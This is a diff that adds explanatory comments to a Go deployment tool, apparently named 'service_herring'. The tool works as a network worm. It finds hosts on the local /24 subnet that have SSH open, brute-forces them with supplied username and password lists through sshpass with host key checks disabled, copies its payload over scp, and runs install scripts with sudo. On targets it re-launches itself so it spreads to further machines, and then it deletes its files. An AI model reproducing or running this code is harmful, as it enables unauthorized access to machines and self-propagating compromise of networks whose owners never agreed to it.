@@ -25,6 +25,7 @@ var ignoreIPs []string
 var wg sync.WaitGroup
 
 func main() {
+	//Handle arguments
 	args := os.Args
 	if !handleArgs(args) {
 		return
@@ -37,16 +38,20 @@ func main() {
 		fmt.Println("Dependencies installed")
 	}
 	if isTarget && !isDemo {
+		//Transfer files to target machine for deployment
 		transferFilesRunner([]string{targetIP})
 	} else {
+		//Find all IPs on subnet 0/24
 		ips := findIPs()
 		fmt.Print("IP list: ")
 		fmt.Println(ips)
 		if !isDemo {
+			//Transfer files to all devices on network
 			transferFilesRunner(ips)
 		}
 	}
 
+	//Print final output
 	if isVerbose && !isDemo {
 		fmt.Println("Installed on the following IPs:")
 		for i := 0; i < len(installedIPs); i++ {
@@ -60,7 +65,7 @@ func main() {
 
 func runRemote(username, password, ip string) {
 	if isVerbose {
-		fmt.Println("Running exploit on remote system: " + username + "@" + ip)
+		fmt.Print("Running exploit on remote system: " + username + "@" + ip)
 	} else {
 		fmt.Print("Installing on " + ip)
 		if isThreaded {
@@ -69,25 +74,31 @@ func runRemote(username, password, ip string) {
 			fmt.Println()
 		}
 	}
+	//Use sshpass to connect to host without having to input a password
 	cmd := exec.Command("sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", username+"@"+ip)
 	buffer := bytes.Buffer{}
+	//Commands used to deploy exploit on remote system
 	command := "cd /tmp/service_herring/\n" +
 		"echo " + password + " | sudo -S chmod +x deploy/dependencies.sh\n" +
 		"echo " + password + " | sudo -S ./deploy/dependencies.sh\n" +
 		"echo " + password + " | sudo -S chmod +x install.sh\n" +
 		"echo " + password + " | sudo -S ./install.sh\n"
 	if isTarget {
+		//If this is a target, add commands to deploy to other devices
 		command += "cd deploy\n" +
 			"echo " + password + " | sudo -S go run deploy.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list " + strings.Join(passwords, ",") + "\n"
 	}
 	command += "echo " + password + " | sudo -S rm -rf /tmp/service_herring\n"
+	//Write command to buffer
 	buffer.Write([]byte(command))
 	cmd.Stdin = &buffer
 	if isVerbose {
+		//Command output here is extremely crowded if using multithreading;
+		//for that reason, multithreading and verbose can't be used together.
 		cmd.Stdout = os.Stdout
 		cmd.Stderr = os.Stderr
 	}
-
+	//Run commands on remote system
 	err := cmd.Run()
 	if err != nil {
 		if isVerbose {
@@ -103,11 +114,14 @@ func runRemote(username, password, ip string) {
 }
 
 func sshUp(ip string) bool {
+	//Run a simple nmap scan to see if ssh is up on the target IP
 	cmd := exec.Command("nmap", ip, "-p", "22", "-oG", ".nmapscan-"+ip)
 	cmd.Run()
+	//Read the file and parse the output
 	res := strings.Split(readFile(".nmapscan-"+ip), "\n")
 	os.Remove(".nmapscan-" + ip)
 	for i := 0; i < len(res); i++ {
+		//If port 22 is open, return true
 		if strings.Index(res[i], "Ports: 22") != -1 {
 			str := res[i][strings.Index(res[i], "/")+1:]
 			str = str[:strings.Index(str, "/")]
@@ -120,23 +134,29 @@ func sshUp(ip string) bool {
 }
 
 func transferFilesRunner(ips []string) {
+	//Runner for transferFiles; this is its own separate function
+	//in order to make multithreading easier.
+
+	//Cycle through the list of IPs
 	for i := 0; i < len(ips); i++ {
 		if isVerbose {
 			fmt.Println("Scanning port 22 on " + ips[i])
 		}
+		//Make sure SSH is enabled on port 22 for the target IP
 		if sshUp(ips[i]) {
 			if isThreaded {
+				//If multithreading is enabled, run transferFiles as a gorouting
 				fmt.Println("Checking users on " + ips[i] + " (DETACHED)")
 				wg.Add(1)
 				go transferFiles(ips[i])
 			} else {
 				transferFiles(ips[i])
 			}
-
 		} else {
 			fmt.Println("Host " + ips[i] + " does not have SSH enabled. Skipping...")
 		}
 	}
+	//Wait for deployment to finish on all devices
 	if isThreaded {
 		wg.Wait()
 	}
@@ -148,6 +168,7 @@ func transferFiles(ip string) {
 		fmt.Println("Transferring files to " + ip)
 	}
 	complete := false
+	//Check all possible username+password combinations until one succeeds
 	for u := 0; u < len(usernames); u++ {
 		if isVerbose {
 			fmt.Println("Trying user " + usernames[u])
@@ -158,12 +179,14 @@ func transferFiles(ip string) {
 				command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../service_herring", usernames[u] + "@" + ip + ":/tmp/"}
 				fmt.Println(command)
 			}
+			//Use SCP to transfer the files, since we know SSH is enabled.
 			cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../service_herring", usernames[u]+"@"+ip+":/tmp/")
 			err := cmd.Run()
 			if err == nil {
 				if isVerbose {
 					fmt.Println("Files sent")
 				}
+				//After file transfer has succeeded, run commands on remote system to install
 				runRemote(usernames[u], passwords[p], ip)
 				complete = true
 				break
@@ -186,6 +209,8 @@ func transferFiles(ip string) {
 }
 
 func findIPs() []string {
+	//Find all valid IPs on the 0/24 subnet
+	//TODO continue here
 	var ipList []string
 	localIp := GetOutboundIP()
 	if isVerbose {
